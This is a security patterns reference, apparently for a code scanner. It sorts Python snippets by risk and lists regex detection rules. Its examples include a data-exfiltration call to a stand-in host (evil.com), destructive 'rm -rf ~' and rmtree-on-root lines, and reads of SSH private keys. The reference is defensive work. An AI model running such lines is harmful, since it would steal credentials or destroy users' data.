# Security Patterns Reference

## High Risk Patterns

### Command Injection
```python
# DANGER: Dynamic command execution
eval(user_input)
exec(user_input)
os.system(f"rm -rf {user_path}")  # Variable in command
subprocess.call(user_command, shell=True)
```

### Data Exfiltration
```python
# DANGER: Sending data to external servers
requests.post("http://evil.com/steal", data=sensitive_data)
urllib.request.urlopen("http://suspicious.site/?data=" + credentials)
```

### File System Destruction
```python
# DANGER: System file deletion
shutil.rmtree("/")
os.system("rm -rf ~")
```

### Credential Harvesting
```python
# DANGER: Stealing credentials
open("~/.ssh/id_rsa").read()
open("~/.openclaw/config.json").read()  # Reading config files
```

## Medium Risk Patterns

### Network Requests
```python
# CAUTION: External network calls
requests.get("http://unknown-domain.com")
urllib.request.urlopen(external_url)
```

### File Operations Outside Workspace
```python
# CAUTION: Accessing files outside working directory
open("/etc/passwd")
open("~/.bashrc", "w")
```

### Code Obfuscation
```python
# CAUTION: Encoded/encrypted code
base64.b64decode(suspicious_string)
codecs.decode(obfuscated_code, 'rot13')
```

### Dynamic Imports
```python
# CAUTION: Runtime module loading
__import__(module_name)
importlib.import_module(dynamic_module)
```

## Low Risk Patterns

### Acceptable Operations
```python
# OK: Static shell commands
os.system("echo hello")
subprocess.run(["ls", "-la"], check=True)

# OK: Workspace file operations
open("./output.txt", "w")
os.path.join(workspace, "file.txt")

# OK: Reading environment
os.environ.get("HOME")
```

## Regex Patterns for Detection

### Dangerous Functions
- `eval\s*\(`
- `exec\s*\(`
- `os\.system\s*\(.*\+`
- `subprocess\.call\s*\(.*shell\s*=\s*True`
- `subprocess\.run\s*\(.*shell\s*=\s*True`

### Network Patterns
- `requests\.(get|post|put|delete)\s*\(`
- `urllib\.(request|urlopen)`
- `http\.client`
- `socket\.`

### File System Patterns
- `open\s*\(.*\/etc\/`
- `open\s*\(.*\.ssh`
- `shutil\.rmtree`
- `os\.remove\s*\(.*\*`

### Sensitive Data
- `password`
- `token`
- `secret`
- `key`
- `credential`
- `api_key`
